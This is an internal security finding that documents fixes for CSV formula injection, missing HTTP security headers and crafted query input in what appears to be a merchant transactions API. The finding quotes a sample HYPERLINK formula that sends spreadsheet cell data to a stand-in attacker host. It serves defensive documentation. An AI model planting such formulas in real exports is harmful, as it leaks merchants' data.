# 13: Hardening: CSV formulas, security headers, crafted input

| | |
|---|---|
| **Severity** | Low (each) |
| **Status** | Fixed (5 commits, not pushed) |
| **Component** | `transactions/exportCsv.ts`, new `plugins/securityHeaders.ts`, new `lib/queryParams.ts`, `onboarding/businessProfile.ts` |
| **Found** | Security review, 2026-10-30 |

## What was wrong

1. **CSV/formula injection.** The transactions export quoted only `,`, `"` and
   newline. The `reference` column comes from the API caller and often holds
   end-customer order text. A reference such as
   `=HYPERLINK("http://evil.example/?"&A1,"Click")` opened as a live formula
   when the merchant loaded the export into Excel or Google Sheets.
2. **No security headers.** No `X-Content-Type-Options`, no framing or
   referrer policy, and no `Cache-Control` on per-user API responses
   (balances, transactions, KYC files), so browsers or shared proxies could
   cache them.
3. **Crafted input caused 500s.**
   - `?limit=abc` became `LIMIT NaN` in eight list routes.
   - An unknown key in a business-profile PATCH became the SQL
     `undefined = $2`.

   Neither was injectable, but each logged a database error and returned 500.

## Fix

| # | Commit | What |
|---|---|---|
| 1 | `test: CSV formulas, security headers and crafted input` | 4 cases, all fail before the fix. |
| 2 | `transactions: neutralise formulas in the CSV export` | Cells starting with `= + - @`, tab or CR get a leading `'` (OWASP guidance); CR is quoted too. |
| 3 | `api: send baseline security headers and no-store on every response` | `nosniff`, `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `Referrer-Policy: no-referrer`, `Cache-Control: no-store` on `/v1`, HSTS in production. |
| 4 | `api: crafted query and body input is a 400, not a 500` | `parseLimitParam` in all eight list routes (routes still clamp as before). Unknown business-profile fields are `400 unknown_field`. |
| 5 | `docs: cyper 13, hardening` | This file. |

## Verified

`hardening.test.ts` (4) and the route suites for every touched route pass
(129 tests), including the analytics limit-clamping contract (0 and negative
still clamp to 1).

## Behaviour change

A reference that starts with `=`, `+`, `-` or `@` now appears in the CSV with a
leading `'`. Spreadsheets show it as text, without the quote. A script reading
the raw CSV sees the quote.
